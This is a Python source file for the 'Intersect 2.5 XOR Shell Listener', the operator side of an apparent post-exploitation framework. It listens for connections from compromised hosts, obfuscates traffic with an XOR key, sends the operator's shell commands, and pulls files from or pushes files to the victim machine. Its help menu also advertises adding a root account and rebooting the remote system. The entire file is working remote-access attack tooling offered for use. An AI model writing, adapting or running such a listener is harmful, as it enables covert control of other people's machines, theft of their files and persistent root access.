#!/usr/bin/python

# Intersect 2.5
# XOR Shell Listener
# trial version. don't expect this to work all that well.

import os, sys
import socket
import time

activePID = []
socksize = 4096

try:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    pin = sys.argv[3]
except IndexError:
    print("You must specify an IP address, port and XOR cipher key.")
    print("usage: ./tcp-client.py 192.168.1.4 4444 KEY")
    sys.exit()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
server.bind((HOST, PORT))
server.listen(5)
print("Listening on port %s for 5 connetions..." % PORT)


def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data

def accept():
    while 1:
        conn, addr = server.accept()
        print "[!] New connection!"
        reaper()
        childPid = os.fork()
        if childPid == 0:
            handler(conn)
        else:
            activePID.append(childPid)

def handler(conn):
    time.sleep(3)

    while True:
        data = conn.recv(socksize)
        data2 = xor(data, pin)
        msg = raw_input(data2)
        cmd = xor(msg, pin)
        conn.sendall(str(cmd))
        if msg == (':killme'):
            print("[!] Shutting down shell!")
            conn.close()
            sys.exit(0)
        elif msg.startswith(':download'):
            getname = msg.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, pin)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.exists(filename) is True:
                print("[+] Download complete.")
                print("[+] File location: " + os.getcwd()+"/"+filename)
        elif msg.startswith(':upload'):
            getname = msg.split(" ")
            loc_file = getname[1]
            sendfile = open(loc_file, "r")
            filedata = sendfile.read()
            sendfile.close()
            senddata = xor(filedata, pin)
            conn.sendall(senddata)
        elif msg == (":exec"):
            print("Feature not yet fully implemented!")
        elif msg == (":help"):
            print(" Available Commands: ")
            print("---------------------------------")
            print(" :download <file>  | download file from host")
            print(" :upload <file>    | upload file to host")
            print(" :mods             | list available modules")
            print(" :exec <task>      | run Intersect tasks")
            print(" :addroot <name>   | add new root account")
            print(" :reboot           | reboot remote host system")
            print(" :help             | display this menu")
            print(" :killme           | shuts down shell connection\n")
            print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")

    conn.close()
    os._exit(0)

accept()

